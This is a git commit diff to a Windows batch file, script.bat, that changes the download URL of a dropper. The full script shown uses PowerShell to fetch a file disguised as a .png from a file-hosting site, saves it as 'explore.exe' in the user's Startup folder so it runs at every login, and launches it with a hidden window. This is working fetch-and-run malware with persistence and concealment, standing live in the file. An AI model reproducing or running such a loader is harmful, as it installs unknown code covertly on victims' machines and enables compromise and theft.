cbc39f05e0dfa5f171602d11b88279006b45a4db
Sombrant <128651023+sombrant@users.noreply.github.com>
2024-12-16 16:29:43 +0100

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set "DownloadURL=https://files.catbox.moe/6gruhh.png"
+set "DownloadURL=https://files.catbox.moe/qvz4aw.png"
 set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
 powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
 powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
